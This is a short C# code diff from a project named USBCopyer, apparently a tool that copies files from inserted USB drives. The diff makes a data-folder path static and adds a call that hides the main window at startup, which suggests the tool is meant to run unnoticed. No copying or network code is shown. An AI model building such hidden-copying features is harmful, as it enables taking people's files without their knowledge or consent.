@@ -15,7 +15,7 @@ namespace USBCopyer
     public partial class Host : Form
     {
         public string title   = Application.ProductName;
-        public string dir     = Application.StartupPath + @"\USBCopyerData\";
+        public static string dir     = Application.StartupPath + @"\USBCopyerData\";
         public string[] white;
         public string[] black;
         public string[] blackdisk;
@@ -24,6 +24,7 @@ namespace USBCopyer
 
         public Host()
         {
+            Hide();
             InitializeComponent();
             setIconX(iconStatus.free);
             if (!string.IsNullOrEmpty(Properties.Settings.Default.dir))
